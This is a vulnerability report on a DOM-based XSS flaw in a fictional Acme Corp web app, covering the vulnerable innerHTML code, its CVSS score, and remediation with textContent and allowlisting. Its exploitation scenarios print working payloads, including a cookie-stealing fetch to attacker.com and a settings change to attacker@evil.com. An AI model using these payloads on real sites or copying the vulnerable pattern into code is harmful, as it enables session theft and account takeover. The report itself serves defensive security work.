# DOM-based Cross-Site Scripting (XSS) in URL Parameter Processing

# Vulnerability Case
During the assessment of Acme Corp's client-side code in a modern JavaScript single-page application, we discovered a DOM-based cross-site scripting (XSS) vulnerability. The issue was identified when reviewing modules that directly inject URL parameters into the page's DOM without proper validation or allowlisting. The vulnerability allows an attacker to craft a malicious link containing a query parameter that, when processed, dynamically inserts unintended HTML or JavaScript into the page. This behavior was repeatedly observed during dynamic testing of the `default` URL parameter, which is appended directly into a critical page element. The affected technology stack includes standard ECMAScript in modern browsers with a codebase incorporating vanilla JavaScript for DOM manipulation.

```javascript
// Vulnerable snippet in Acme Corp's single-page application
(function () {
  // Extract the 'default' query parameter from the URL
  const params = new URLSearchParams(window.location.search);
  const defaultValue = params.get("default");

  if (defaultValue) {
    // Directly injecting user-controlled content into the DOM without sanitization
    document.getElementById("user-content").innerHTML = defaultValue;
  }
})();
```

The exploitation method involves an attacker sending a malicious URL—such as `http://www.acme-corp.com/page.html?default=<script>alert(document.cookie)</script>`—which, when visited by a user, causes the injected script to execute within their browser context. This vulnerability can be leveraged to perform session hijacking, defacement, or perform undetected actions on behalf of the user, thereby compromising sensitive user data and business integrity. The technical risk is compounded by the ease with which client-side JavaScript can be manipulated, impacting both the reputational and financial standing of the business.


context: javascript.browser.security.dom-based-xss.dom-based-xss Detected possible DOM-based XSS. This occurs because a portion of the URL is being used to construct an element added directly to the page. For example, a malicious actor could send someone a link like this: http://www.some.site/page.html?default=<script>alert(document.cookie)</script> which would add the script to the page. Consider allowlisting appropriate values or using an approach which does not involve the URL.

# Vulnerability Breakdown
This vulnerability involves a client-side DOM-based XSS in Acme Corp's single-page application, where unsanitized URL parameters are directly injected into the DOM.

1. **Key vulnerability elements**:
   - Direct use of user-controlled URL parameters (`default` parameter) in DOM manipulation
   - Use of unsafe `innerHTML` method instead of safer alternatives
   - No sanitization, encoding, or validation of input
   - Modern JavaScript single-page application environment
   - Exploitable through specially crafted URLs

2. **Potential attack vectors**:
   - Malicious links distributed via email, social media, or messaging platforms
   - Link shorteners that hide the malicious payload
   - Social engineering combined with crafted URLs
   - Potentially exploitable through other websites via CSRF if parameters can be set through forms

3. **Severity assessment**:
   - Network-accessible attack vector
   - Low complexity to exploit (crafting a simple URL)
   - No privileges required
   - User interaction required (clicking the link)
   - Access to user session data and cookies
   - Ability to perform actions in the user's context

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): Required (R) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): Low (L) 
   - Integrity (I): Low (L) 
   - Availability (A): None (N) 

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N

# Description
A DOM-based Cross-Site Scripting (XSS) vulnerability has been discovered in Acme Corp's single-page JavaScript application. The application extracts the "default" query parameter from the URL and directly injects it into the page's DOM without proper sanitization or validation.

```javascript
// Vulnerable snippet in Acme Corp's single-page application
(function () {
  // Extract the 'default' query parameter from the URL
  const params = new URLSearchParams(window.location.search);
  const defaultValue = params.get("default");

  if (defaultValue) {
    // Directly injecting user-controlled content into the DOM without sanitization
    document.getElementById("user-content").innerHTML = defaultValue;
  }
})();

```

This vulnerability allows attackers to craft malicious URLs containing JavaScript code that will execute in the context of the victim's browser. For example, an attacker could create a link like `http://www.acme-corp.com/page.html?default=<script>alert(document.cookie)</script>` and trick users into clicking it. When the victim visits this URL, the JavaScript code in the parameter will be injected into the page and executed, potentially allowing attackers to steal session cookies, hijack user sessions, perform actions on behalf of the user, or manipulate the page content.

# CVSS
**Score**: 5.4 \
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N \
**Severity**: Medium

The vulnerability is rated as Medium severity (5.4) based on the following analysis:

- **Network Attack Vector (AV:N)**: The vulnerability can be exploited remotely over the internet by sending crafted URLs to victims.

- **Low Attack Complexity (AC:L)**: Exploiting this vulnerability is straightforward and requires no special conditions - an attacker simply needs to create a URL with malicious content in the "default" parameter.

- **No Privileges Required (PR:N)**: No authentication or authorization is needed to exploit this vulnerability. Any user can craft and distribute malicious URLs.

- **User Interaction Required (UI:R)**: Exploitation requires a victim to click on a malicious link or otherwise visit a specially crafted URL.

- **Unchanged Scope (S:U)**: The vulnerability impacts only the vulnerable component (the web application) and doesn't allow compromising other components.

- **Low Confidentiality Impact (C:L)**: The vulnerability allows access to some restricted information, such as cookies and session data, but not all system data.

- **Low Integrity Impact (I:L)**: The attacker can modify some data on the client-side by injecting content, potentially tricking users or defacing the page.

- **No Availability Impact (A:N)**: The vulnerability doesn't directly impact the availability of the system.

While the impact of this vulnerability is constrained by requiring user interaction and having limited direct impact on confidentiality and integrity, it still poses a significant risk because it can lead to session hijacking and unauthorized actions.

# Exploitation Scenarios
**Scenario 1: Session Hijacking**
An attacker crafts a malicious URL: `http://www.acme-corp.com/page.html?default=<script>fetch('https://attacker.com/steal?cookie='+encodeURIComponent(document.cookie))</script>`. The attacker then distributes this URL via email, social media, or other channels. When a victim clicks the link, the injected script executes in their browser, sending their session cookies to the attacker's server. The attacker can then use these cookies to impersonate the victim and gain unauthorized access to their account.

**Scenario 2: Phishing Attack**
An attacker creates a URL with a payload that injects a fake login form: `http://www.acme-corp.com/page.html?default=<div class="login-overlay"><form>Username: <input><br>Password: <input type="password"><br><button onclick="sendCredentials()">Log in</button></form></div><script>function sendCredentials(){/*malicious code*/}</script>`. When the victim visits this URL, they see what appears to be a legitimate login prompt from Acme Corp. If they enter their credentials, the malicious script captures and sends them to the attacker.

**Scenario 3: Unauthorized Actions**
An attacker creates a URL with a payload that performs actions on behalf of the victim: `http://www.acme-corp.com/page.html?default=<img src="x" onerror="fetch('/api/user/settings', {method:'POST', credentials:'include', body:JSON.stringify({notifications:'attacker@evil.com'})});">`. When the victim visits this URL, the script silently changes their notification email to the attacker's address, potentially allowing the attacker to receive sensitive information or password reset links.

**Scenario 4: Persistent Attack via URL Sharing**
In a more sophisticated attack, the malicious URL contains code that not only executes an attack but also modifies any links on the page to include the same payload, creating a self-propagating attack. When victims share links from the compromised page, they unknowingly distribute the attack to others.

# Impact Analysis
**Business Impact:**
- Reputational damage from publicly disclosed XSS vulnerabilities
- Loss of customer trust if user accounts are compromised
- Potential legal and regulatory consequences if personal data is exposed
- Financial losses from incident response, forensic investigation, and customer notification
- Possible compensation costs for affected users
- Brand damage if attackers deface the application or display inappropriate content

**Technical Impact:**
- Unauthorized access to user accounts and sensitive information
- Theft of session cookies leading to session hijacking
- Unauthorized actions performed in the context of the victim's browser
- Data integrity issues through manipulation of displayed content
- Potential for more advanced attacks like client-side request forgery
- User privacy violations through access to browser information
- Ability to bypass same-origin policy restrictions for the affected domain
- Browser-based cryptocurrency mining or other resource abuse
- Propagation of attacks to other users if combined with content sharing features
- Potential for damaging persistent client-side malware if the application uses client-side storage

# Technical Details
The DOM-based XSS vulnerability occurs due to unsafe DOM manipulation practices in the client-side JavaScript code. Let's examine the vulnerable code and exploitation mechanics in detail:

```javascript
(function () {
  // Extract the 'default' query parameter from the URL
  const params = new URLSearchParams(window.location.search);
  const defaultValue = params.get("default");

  if (defaultValue) {
    // Directly injecting user-controlled content into the DOM without sanitization
    document.getElementById("user-content").innerHTML = defaultValue;
  }
})();

```

**Vulnerability Analysis:**

1. **Unsafe DOM Property**: The code uses `innerHTML`, which parses and renders HTML, including executing JavaScript in various contexts (script tags, event handlers, javascript: URLs).

2. **Direct Injection**: The user-controlled parameter value is directly assigned to the DOM without any sanitization, validation, or encoding.

3. **Self-Executing Function**: The code runs immediately when the page loads, making the vulnerability exploitable simply by visiting a crafted URL.

4. **Attack Flow:**
   - Attacker crafts a URL with a malicious `default` parameter
   - When the page loads, the code extracts the parameter value
   - The value is directly assigned to the innerHTML property
   - The browser parses the injected content as HTML, executing any scripts

5. **Exploitation Methods:**
   - `<script>` tags: `?default=<script>alert(document.cookie)</script>`
   - Event handlers: `?default=<img src=x onerror=alert(document.cookie)>`
   - JavaScript URLs: `?default=<a href=javascript:alert(document.cookie)>Click me</a>`
   - Encoded payloads: `?default=%3Cscript%3Ealert(document.cookie)%3C/script%3E`

**What Makes This a DOM-based XSS:**

This is specifically a DOM-based XSS (as opposed to reflected or stored XSS) because:
- The vulnerability exists entirely in client-side code
- The payload is never sent to or processed by the server
- The exploit occurs during DOM manipulation by the client-side JavaScript
- The source (URL parameter) and sink (innerHTML) are both in the client-side environment

**Contextual Factors:**

- Modern browsers' XSS Auditors might block some basic attacks, but sophisticated payloads can bypass these protections
- The vulnerability exists in a single-page application, which typically has greater access to sensitive client-side data
- Since the application uses vanilla JavaScript, it may lack the built-in protections that some frameworks provide
- The attacker can potentially access any client-side state or perform any action the user is authorized to do

# Remediation Steps
## Use Safe DOM Methods Instead of innerHTML

**Priority**: P0

Replace the unsafe `innerHTML` property with safer alternatives that don't execute JavaScript:

```javascript
(function () {
  const params = new URLSearchParams(window.location.search);
  const defaultValue = params.get("default");

  if (defaultValue) {
    // Use textContent instead of innerHTML to prevent script execution
    document.getElementById("user-content").textContent = defaultValue;
    
    // Alternatively, if HTML formatting is needed but not scripts:
    // const sanitizedValue = DOMPurify.sanitize(defaultValue);
    // document.getElementById("user-content").innerHTML = sanitizedValue;
  }
})();

```

The `textContent` property treats the input as plain text rather than HTML, preventing script execution entirely. If HTML formatting is required, a library like DOMPurify should be used to sanitize the input before insertion. This change prevents script execution while still allowing the application to use the URL parameter.
## Implement Input Validation with Allowlisting

**Priority**: P1

Implement strict input validation to ensure the parameter only contains expected values:

```javascript
(function () {
  const params = new URLSearchParams(window.location.search);
  const defaultValue = params.get("default");

  // Define a list of allowed values
  const allowedValues = ["option1", "option2", "option3"];

  if (defaultValue && allowedValues.includes(defaultValue)) {
    // Only proceed if the value is in our allowlist
    document.getElementById("user-content").textContent = defaultValue;
  } else if (defaultValue) {
    // Log invalid input attempts for security monitoring
    console.warn("Invalid 'default' parameter value rejected");
    // Optionally set a default value instead
    document.getElementById("user-content").textContent = "Default View";
  }
})();

```

This approach restricts the `default` parameter to a predefined set of valid values, completely eliminating the possibility of injection attacks. It's particularly suitable for cases where the parameter should only contain a limited set of options, such as view modes or display preferences.


# References
* CWE-79 | [Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
* DOM Based XSS | [DOM Based XSS Prevention Cheat Sheet](https://owasp.org/www-community/attacks/DOM_Based_XSS)
* CWE-116 | [Improper Encoding or Escaping of Output](https://cwe.mitre.org/data/definitions/116.html)
